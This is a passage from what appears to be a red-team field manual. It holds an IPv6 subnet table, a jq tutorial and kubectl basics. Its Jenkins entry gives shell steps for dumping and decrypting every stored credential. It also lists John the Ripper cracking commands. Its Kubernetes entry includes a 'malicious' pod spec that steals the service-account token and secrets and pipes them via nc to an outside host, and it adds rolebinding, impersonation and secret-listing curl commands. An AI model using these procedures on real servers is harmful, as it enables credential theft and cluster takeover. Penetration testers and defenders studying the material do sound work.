35,184,372,088,832 
1/524,288 
/82 
70,368,744,177,664 
1/262,144 
/81 
140,737,488,355,328 
1/131,072 
/80 
281,474,976,710,656 
1/65,536 
/79 
562,949,953,421,312 
1/32,768 
/78 
1,125,899,906,842,620 
1/16,384 
/77 
2,251,799,813,685,240 
1/8,192 
/76 
4,503,599,627,370,490 
1/4,096 
/75 
9,007,199,254,740,990 
1/2,048 
/74 
18,014,398,509,481,900 
1/1,024 
/73 
36,028,797,018,963,900 
1/512 
/72 
72,057,594,037,927,900 
1/256 
/71 
144,115,188,075,855,000 
1/128 
/70 
288,230,376,151,711,000 
23377 
/69 
576,460,752,303,423,000 
11689 
/68 
1,152,921,504,606,840,000 
43846 
/67 
2,305,843,009,213,690,000 
43838 
/66 
4,611,686,018,427,380,000 
43834 
/65 
9,223,372,036,854,770,000 
43832 
/64 
18,446,744,073,709,500,000 
Standard 
end user 
allocation 
/63 
36,893,488,147,419,100,000 
2 
/62 
73,786,976,294,838,200,000 
4 
/61 
147,573,952,589,676,000,000 
8 
/60 
295,147,905,179,352,000,000 
16 
102 
/59 
590,295,810,358,705,000,000 
32 
/58 
1,180,591,620,717,410,000,000 
64 
/57 
2,361,183,241,434,820,000,000 
128 
/56 
4,722,366,482,869,640,000,000 
256 
/55 
9,444,732,965,739,290,000,000 
512 
/54 
18,889,465,931,478,500,000,000 
1024 
/53 
37,778,931,862,957,100,000,000 
2048 
/52 
75,557,863,725,914,300,000,000 
4096 
/51 
151,115,727,451,828,000,000,000 
8192 
/50 
302,231,454,903,657,000,000,000 
16384 
/49 
604,462,909,807,314,000,000,000 
32768 
/48 
1,208,925,819,614,620,000,000,000 
65,536 
Standard 
business 
allocation 
/47 
2,417,851,639,229,250,000,000,000 
131072 
/46 
4,835,703,278,458,510,000,000,000 
262144 
/45 
9,671,406,556,917,030,000,000,000 
524288 
/44 
19,342,813,113,834,000,000,000,000 
1048576 
/43 
38,685,626,227,668,100,000,000,000 
2097152 
/42 
77,371,252,455,336,200,000,000,000 
4194304 
/41 
154,742,504,910,672,000,000,000,000 
8388608 
/40 
309,485,009,821,345,000,000,000,000 
16777216 
/39 
618,970,019,642,690,000,000,000,000 
33554432 
/38 
1,237,940,039,285,380,000,000,000,000 
67108864 
/37 
2,475,880,078,570,760,000,000,000,000 
134217728 
/36 
4,951,760,157,141,520,000,000,000,000 
268435456 
/35 
9,903,520,314,283,040,000,000,000,000 
536870912 
/34 
19,807,040,628,566,000,000,000,000,000 
1073741824 
/33 
39,614,081,257,132,100,000,000,000,000 
2147483648 
/32 
79,228,162,514,264,300,000,000,000,000 
4,294,967,2
96 Standard 
ISP 
Allocation 
/31 
158,456,325,028,528,000,000,000,000,000 
8589934592 
/30 
316,912,650,057,057,000,000,000,000,000 
17179869184 
/29 
633,825,300,114,114,000,000,000,000,000 
34359738368 
/28 
1,267,650,600,228,220,000,000,000,000,000 
68719476736 
/27 
2,535,301,200,456,450,000,000,000,000,000 
/26 
5,070,602,400,912,910,000,000,000,000,000 
/25 
10,141,204,801,825,800,000,000,000,000,000 
/24 
20,282,409,603,651,600,000,000,000,000,000 
/23 
40,564,819,207,303,300,000,000,000,000,000 
/22 
81,129,638,414,606,600,000,000,000,000,000 
/21 
162,259,276,829,213,000,000,000,000,000,000 
/20 
324,518,553,658,426,000,000,000,000,000,000 
/19 
649,037,107,316,853,000,000,000,000,000,000 
/18 
1,298,074,214,633,700,000,000,000,000,000,00
0 
103 
/17 
2,596,148,429,267,410,000,000,000,000,000,00
0 
/16 
5,192,296,858,534,820,000,000,000,000,000,00
0 
/15 
10,384,593,717,069,600,000,000,000,000,000,0
00 
/14 
20,769,187,434,139,300,000,000,000,000,000,0
00 
/13 
41,538,374,868,278,600,000,000,000,000,000,0
00 
/12 
83,076,749,736,557,200,000,000,000,000,000,0
00 
/11 
166,153,499,473,114,000,000,000,000,000,000,
000 
/10 
332,306,998,946,228,000,000,000,000,000,000,
000 
/9 
664,613,997,892,457,000,000,000,000,000,000,
000 
/8 
1,329,227,995,784,910,000,000,000,000,000,00
0,000 
IPv6 BIT MAPPING 
XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX 
      ||| |||| |||| |||| |||| |||| |||| 
      ||| |||| |||| |||| |||| |||| |||128 
      ||| |||| |||| |||| |||| |||| ||124 
      ||| |||| |||| |||| |||| |||| |120 
      ||| |||| |||| |||| |||| |||| 116 
      ||| |||| |||| |||| |||| |||112 
      ||| |||| |||| |||| |||| ||108 
      ||| |||| |||| |||| |||| |104 
      ||| |||| |||| |||| |||| 100 
      ||| |||| |||| |||| |||96 
      ||| |||| |||| |||| ||92 
      ||| |||| |||| |||| |88 
      ||| |||| |||| |||| 84 
      ||| |||| |||| |||80 
      ||| |||| |||| ||76 
      ||| |||| |||| |72 
      ||| |||| |||| 68 
      ||| |||| |||64 
      ||| |||| ||60 
      ||| |||| |56 
      ||| |||| 52 
      ||| |||48 
      ||| ||44 
      ||| |40 
      ||| 36 
      ||32 
      |28 
104 
      24 
J 
J
J 
JENKINS_Exploit 
RED TEAM 
ESCALATE PRIVS 
DEVOPS 
Dump Credentials From Jenkins 
SCENARIO: You’ve obtained credentials for a user with build job 
privileges on a Jenkins server. With that user you can now dump all 
the credentials on the Jenkins server and decrypt them by creating 
a malicious build job. 
STEP 1: Log into the Jenkins server with the obtained user account: 
https:///script/ 
STEP 2: Find an obscure location to run your build job and follow 
the below navigational tree: 
New Item -> Freeform Build 
“New Project”-> Configure -> General -> Restrict Where This Is Run 
-> Enter “Master” -> Build -> Add Build Step -> Execute Shell 
STEP 3: Execute the following commands in the shell: 
echo "" 
echo "credentials.xml" 
cat ${JENKINS_HOME}/credentials.xml 
echo "" 
echo "master.key" 
105 
cat ${JENKINS_HOME}/secrets/master.key | base64 -w 0 
echo "" 
echo "hudson.util.Secret" 
cat ${JENKINS_HOME}/secrets/hudson.util.Secret | base64 -w 0 
STEP 4: Save the build job and on the “Jobs” view page click “Build 
Now” 
STEP 5: Navigate to “Build History” and click on your build job 
number. Then click on “Console Output”. 
STEP 6: Copy the text of the “credentials.xml” and place it into a 
local file on your attack workstation named “credentials.xml” 
STEP 7: Copy the base64 encoded “master.key” and 
“hudson.util.Secrets” and decode them into their own files on your 
local attack workstation: 
echo  | base64 --decode > master.key 
echo  | base64 --decode > 
hudson.util.Secret 
STEP 8: Download the “jenkins-decrypt” python script: 
https://github.com/tweksteen/jenkins-decrypt 
STEP 9: Decrypt the “credentials.xml” file using “master.key” and 
“hudson.util.Secret”: 
decrypt.py    
J
J 
JOHN THE RIPPER 
RED TEAM 
PASSWORD CRACKING 
ALL 
John the Ripper is a fast password cracker, currently available for 
many flavors of Unix, macOS, Windows, DOS, BeOS, and OpenVMS. 
ATTACK MODES 
BRUTEFORCE ATTACK 
john --format=#type hash.txt 
DICTIONARY ATTACK 
john --format=#type --wordlist=dict.txt hash.txt 
MASK ATTACK 
john --format=#type --mask=?l?l?l?l?l?l hash.txt -min-len=6 
INCREMENTAL ATTACK 
john --incremental hash.txt 
DICTIONARY + RULES ATTACK 
john --format=#type --wordlist=dict.txt --rules 
RULES 
--rules=Single 
--rules=Wordlist 
106 
--rules=Extra 
--rules=Jumbo 
--rules=KoreLogic 
--rules=All 
INCREMENT 
--incremental=Digits 
--incremental=Lower 
--incremental=Alpha 
--incremental=Alnum 
PARALLEL CPU or GPU 
LIST OpenCL DEVICES 
john --list=opencl-devices 
LIST OpenCL FORMATS 
john --list=formats --format=opencl 
MULTI-GPU (example 3 GPU’s) 
john --format= hash.txt --wordlist=dict.txt --rules -
-dev= --fork=3 
MULTI-CPU (example 8 cores) 
john --wordlist=dict.txt hash.txt --rules --dev= --fork=8 
MISC 
BENCHMARK TEST 
john --test 
SESSION NAME 
john hash.txt --session=example_name 
SESSION RESTORE 
john --restore=example_name 
SHOW CRACKED RESULTS 
john hash.txt --pot= --show 
WORDLIST GENERATION 
john --wordlist=dict.txt --stdout --external:[filter name] > 
out.txt 
BASIC ATTACK METHODOLOGY 
1- DEFAULT ATTACK 
john hash.txt 
2- DICTIONARY + RULES ATTACK 
john --wordlist=dict.txt --rules 
3- MASK ATTACK 
john --mask=?l?l?l?l?l?l hash.txt -min-len=6 
4- BRUTEFORCE INCREMENTAL ATTACK 
john --incremental hash.txt 
J
J 
JQ 
ALL 
INFORMATIONAL 
N/A 
107 
jq - jq is a fantastic command-line JSON processor. jq is a sed-
like tool that is specifically built to deal with JSON. 
###EXAMPLE FILE.JSON CONTENTS 
{ 
  "name": "Buster", 
  "breed": "Golden Retriever", 
  "age": "4", 
  "owner": { 
    "name": "Sally" 
  }, 
  "likes": [ 
    "bones", 
    "balls", 
    "dog biscuits" 
  ] 
} 
Pretty print JSON output 
cat file.json | jq 
Find a Key and Value 
cat file.json | jq '.name' 
#mutltiple keys can be passed with '.name,.age' 
Nested Search Operation 
cat file.json | jq '.owner.name' 
Find Items in an Array 
cat file.json | jq '.likes[0]' 
#multiple array elements '.likes[0:2]' 
Combine Filters 
cat file.json | jq '.[] | .name' 
Transform JSON into new data structures 
cat file.json | jq '[.name, .likes[]]' 
Transform Values within JSON 
Perform basic arithmetic on number values. 
{ "eggs": 2, "cheese": 1, "milk": 1 } 
cat file.json | jq '.eggs + 1' 
3 
Remove Keys from JSON 
cat file.json | jq 'del(.name)' 
Map Values & Perform Operations 
108 
echo '[12,14,15]' | jq 'map(.-2)' 
[ 
  10, 
  12, 
  13 
] 
REFERENCE: 
https://stedolan.github.io/jq/ 
https://shapeshed.com/jq-json/ 
https://thoughtbot.com/blog/jq-is-sed-for-json 
K 
K
K 
KUBERNETES 
ALL 
INFORMATIONAL 
DEVOPS 
Kubernetes is an open-source container-orchestration system for 
automating application deployment, scaling, and management. It was 
originally designed by Google and is now maintained by the Cloud 
Native Computing Foundation. 
REFERENCE: 
https://intellipaat.com/mediaFiles/2019/03/Kubernetes-Cheat-Sheet.pdf 
K
K 
KUBERNETES_Exploit 
RED/BLUE TEAM 
VULN SCAN 
DEVOPS 
109 
kubeaudit  
is a command line tool to audit Kubernetes clusters for various 
different security concerns: run the container as a non-root user, 
use a read only root filesystem, drop scary capabilities, don't add 
new ones, don't run privileged, ... 
https://github.com/Shopify/kubeaudit 
kubesec.io 
Online security risk analysis for Kubernetes resources. 
https://kubesec.io/ 
kube-bench 
is a Go application that checks whether Kubernetes is deployed 
securely by running the checks documented in the CIS Kubernetes 
Benchmark. 
https://github.com/aquasecurity/kube-bench 
katacoda 
Online learn Kubernetes using interactive browser-based scenarios. 
https://katacoda.com/courses/kubernetes 
RBAC Configuration 
LISTING SECRETS 
An attacker that gains access to list secrets in the cluster can 
use the following curl commands to get all secrets in "kube-system" 
namespace. 
curl -v -H "Authorization: Bearer " 
https://:/api/v1/namespaces/kube-system/secrets/ 
Kubernetes Secrets File Locations 
In Kubernetes secrets such as passwords, api_tokens, and SSH keys 
are stored “Secret”. Also be on the lookout for volume mount points 
where secrets can be stored as well and referenced by the pod. 
You can query what secrets are stored by issuing: 
$ kubectl get secrets 
$ kubectl describe secrets/ 
To decode a secret username or password perform the following: 
$ echo '' | base64 –decode 
$ echo '' | base64 --decode 
POD CREATION 
Check your rights with:  
kubectl get role system:controller:bootstrap-signer -n kube-system 
-o yaml 
Then create a malicious pod.yaml file: 
apiVersion: v1 
110 
kind: Pod 
metadata: 
  name: alpine 
  namespace: kube-system 
spec: 
  containers: 
  - name: alpine 
    image: alpine 
    command: ["/bin/sh"] 
    args: ["-c", 'apk update && apk add curl --no-cache; cat 
/run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; 
curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: 
application/json" 
https://192.168.154.228:8443/api/v1/namespaces/kube-
system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000'] 
  serviceAccountName: bootstrap-signer 
  automountServiceAccountToken: true 
  hostNetwork: true 
Then  
kubectl apply -f malicious-pod.yaml 
PRIVILEGE TO USE PODS/EXEC 
kubectl exec -it  -n  –- sh 
PRIVILEGE TO GET/PATCH ROLEBINDINGS 
The purpose of this JSON file is to bind the admin "ClusterRole" to 
the compromised service account. Create a malicious 
RoleBinging.json file: 
{ 
    "apiVersion": "rbac.authorization.k8s.io/v1", 
    "kind": "RoleBinding", 
    "metadata": { 
        "name": "malicious-rolebinding", 
        "namespcaes": "default" 
    }, 
    "roleRef": { 
        "apiGroup": "*", 
        "kind": "ClusterRole", 
        "name": "admin" 
    }, 
    "subjects": [ 
        { 
            "kind": "ServiceAccount", 
            "name": "sa-comp" 
            "namespace": "default" 
        } 
    ] 
} 
111 
curl -k -v -X POST -H "Authorization: Bearer " -H 
"Content-Type: application/json" 
https://:/apis/rbac.authorization.k8s.io/v1/namesp
aces/default/rolebindings -d @malicious-RoleBinging.json 
Retrieve secrets with new compromised token access: 
curl -k -v -X POST -H "Authorization: Bearer " -H "Content-Type: application/json" 
https://:/api/v1/namespaces/kube-system/secret 
IMPERSONATING A PRIVILEGED ACCOUNT 
curl -k -v -XGET -H "Authorization: Bearer " -H "Impersonate-Group: system:masters" -H 
"Impersonate-User: null" -H "Accept: application/json" 
https://:/api/v1/namespaces/kube-system/secrets/ 
PRIVILEGED SERVICE ACCOUNT TOKEN 
$ cat /run/secrets/kubernetes.io/serviceaccount/token 
$ curl -k -v -H "Authorization: Bearer " 
https://:/api/v1/namespaces/default/secrets/ 
ENUMERABLE ENDPOINTS 
# List Pods 
curl -v -H "Authorization: Bearer " 
https://:/api/v1/namespaces/default/pods/ 
# List secrets 
curl -v -H "Authorization: Bearer " 
https://:/api/v1/namespaces/default/secrets/ 
# List deployments 
curl -v -H "Authorization: Bearer " 
https:///apis/extensions/v1beta1/namespaces/defaul
t/deployments 
# List daemonsets 
curl -v -H "Authorization: Bearer " 
https:///apis/extensions/v1beta1/namespaces/defaul
t/daemonsets 
VARIOUS API ENDPOINTS 
cAdvisor 
curl -k https://:4194 
Insecure API server 
curl -k https://:8080 
112 
Secure API Server 
curl -k https://:(8|6)443/swaggerapi 
curl -k https://:(8|6)443/healthz 
curl -k https://:(8|6)443/api/v1 
etcd API 
curl -k https://:2379 
curl -k https://:2379/version 
etcdctl --endpoints=http://:2379 get / --prefix --keys-
only 
Kubelet API 
curl -k https://:10250 
curl -k https://:10250/metrics 
curl -k https://:10250/pods 
kubelet (Read only) 
curl -k https://:10255 
http://:10255/pods 
REFERENCE: 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Kubernetes 
https://securityboulevard.com/2019/08/kubernetes-pentest-methodology-part-
1/ 
https://securityboulevard.com/2019/09/kubernetes-pentest-methodology-part-2 
K
K 
KUBECTL 
ALL 
ADMINISTRATION 
DEVOPS 
Kubectl is a command line tool for controlling Kubernetes clusters. 
KUBECTL CONTEXT/CONFIGURE 
KUBECONFIG=~/.kube/config:~/.kube/kubconfig2  
use multiple 
kubeconfig files 
at the same time 
and view merged 
config 
kubectl config view 
Show Merged 
kubeconfig 
settings. 
kubectl config view -o 
jsonpath='{.users[?(@.name == 
"e2e")].user.password}' 
get the password 
for the e2e user 
kubectl config view -o 
jsonpath='{.users[].name}'    
display the first 
user 
113 
kubectl config view -o 
jsonpath='{.users[*].name}'   
get a list of 
users 
kubectl config get-contexts                          
display list of 
contexts  